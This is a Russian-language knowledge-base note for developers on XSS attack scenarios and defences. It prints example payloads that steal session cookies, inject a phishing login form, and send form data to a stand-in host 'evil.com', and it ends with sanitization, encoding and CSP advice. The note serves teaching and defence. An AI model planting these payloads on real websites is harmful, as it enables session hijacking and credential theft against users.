---
aliases: [Сценарии атак XSS, Примеры XSS-атак, Реальные случаи XSS]
tags: [security, xss, attack-vectors, web-security]
---

# Сценарии-атак

## Обзор

Сценарии атак XSS (Cross-Site Scripting) представляют собой конкретные примеры того, как злоумышленники могут эксплуатировать уязвимости межсайтового скриптинга для выполнения вредоносных действий в веб-приложениях. Понимание этих сценариев позволяет разработчикам лучше защищать свои приложения.

## Классические сценарии атак XSS

### 1. Угон сессии через XSS
**Описание**: Злоумышленник внедряет скрипт, который отправляет cookie сессии на его сервер.
```javascript
<script>
new Image().src="http://evil.com/steal?cookie="+document.cookie;
</script>
```
**Последствия**: Злоумышленник получает доступ к учетной записи жертвы.

### 2. Фишинг в контексте доверенного сайта
**Описание**: Внедрение формы входа, имитирующей оригинальную.
```html
<div>Пожалуйста, войдите снова для подтверждения аккаунта</div>
<form action="http://evil.com/collect">
<input type="text" name="username" placeholder="Логин">
<input type="password" name="password" placeholder="Пароль">
</form>
```
**Последствия**: Пользователь вводит свои учетные данные, которые отправляются злоумышленнику.

### 3. Перенаправление на вредоносный сайт
**Описание**: Автоматическое перенаправление пользователя на фишинговый сайт.
```javascript
<script>
window.location="http://fake-site.com";
</script>
```
**Последствия**: Пользователь попадает на сайт, имитирующий оригинальный.

### 4. Кража данных из форм
**Описание**: Скрипт, который собирает данные из заполненных форм.
```javascript
<script>
window.addEventListener('submit', function(e) {
  var data = JSON.stringify(e.target.elements);
  new Image().src='http://evil.com/form_data?data='+encodeURIComponent(data);
});
</script>
```
**Последствия**: Персональные данные пользователя передаются злоумышленнику.

## Современные сценарии атак XSS

### 1. XSS через DOM-манипуляции
**Описание**: Использование уязвимостей в клиентском JavaScript для выполнения XSS.
```javascript
// Вредоносный URL: example.com/page?default='#};alert(1);//
var config = {
  default: '#'
};
// Результат: alert(1) выполняется
```

### 2. XSS в веб-компонентах
**Описание**: Использование уязвимостей в пользовательских элементах.
```html
<custom-element data-content="внедренный скрипт"></custom-element>
```

### 3. XSS через шаблонные строки
**Описание**: Небезопасное использование шаблонных строк в JavaScript.
```javascript
// Небезопасный код
const template = `<div>${userInput}</div>`;
```

### 4. XSS в системах шаблонизации
**Описание**: Обход защиты в шаблонных движках.
```handlebars
{{#if admin}}
  {{{userContent}}}  <!-- Небезопасный вывод без экранирования -->
{{/if}}
```

## Атаки с использованием современных API

### 1. XSS через Web Storage
**Описание**: Использование localStorage/sessionStorage для хранения вредоносного скрипта.
```javascript
localStorage.setItem('template', '<script>alert("XSS")</script>');
// Позже этот шаблон может быть использован в приложении
```

### 2. XSS через Service Workers
**Описание**: Компрометация Service Worker для внесения изменений в ответы сервера.
```javascript
self.addEventListener('fetch', function(event) {
  // Злоумышленник может изменить ответы, добавив вредоносный скрипт
});
```

## Примеры реальных атак XSS

### Пример 1: XSS в социальной сети
- **Год**: 2017
- **Платформа**: Facebook
- **Метод**: Reflected XSS через параметр URL
- **Последствия**: Возможность выполнения скриптов от имени пользователей

### Пример 2: XSS в мессенджере
- **Год**: 2019
- **Платформа**: Twitter
- **Метод**: Stored XSS через твиты
- **Последствия**: Автоматическая ретрансляция вредоносного скрипта

### Пример 3: XSS в CMS
- **Год**: 2020
- **Платформа**: WordPress
- **Метод**: DOM-based XSS в админ-панели
- **Последствия**: Компрометация административных аккаунтов

## Сценарии атак с эскалацией

### 1. XSS → CSRF
- Использование XSS для выполнения CSRF-атаки
- Злоумышленник может выполнить действия от имени пользователя

### 2. XSS → Clickjacking
- Комбинация XSS с clickjacking для манипуляции действиями пользователя
- Пользователь нажимает на элементы, не подозревая об этом

### 3. XSS → Account Takeover
- Использование XSS для получения учетных данных
- Злоумышленник получает полный доступ к аккаунту

## Защита от сценариев атак

### 1. Санитизация ввода
- Использование белых списков разрешенных тегов и атрибутов
- Применение безопасных библиотек санитизации

### 2. Кодирование вывода
- Экранирование специальных символов в зависимости от контекста
- Использование безопасных методов вывода данных

### 3. Content Security Policy
- Ограничение источников выполнения скриптов
- Предотвращение выполнения внедренного кода

## Связанные темы

- [[Типы-XSS]]
- [[Санитизация-ввода]]
- [[Кодирование-вывода]]
- [[Методы-санитизации]]
- [[Content-Security-Policy]]

> [!tip] Совет
> Регулярно тестируйте приложение на известные сценарии атак XSS, особенно после добавления новых функций.

> [!warning] Важно
> Новые сценарии атак XSS постоянно появляются с развитием веб-технологий, поэтому важно следить за последними уязвимостями и методами защиты.